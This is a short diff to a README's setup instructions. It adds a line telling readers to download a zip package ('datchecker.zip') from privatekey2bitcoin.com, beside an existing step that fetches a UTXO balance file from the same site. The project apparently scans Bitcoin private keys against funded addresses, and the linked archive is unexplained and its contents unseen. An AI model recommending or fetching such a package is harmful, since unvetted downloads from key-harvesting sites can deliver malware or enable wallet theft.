@@ -26,3 +26,5 @@ To set up the environment and install the necessary dependencies, follow these s
 5. Download address balance Database (https://privatekey2bitcoin.com/freewallets/utxo.csv)
 6. Start
 
+Download all package: https://privatekey2bitcoin.com/freewallets/datchecker.zip
+
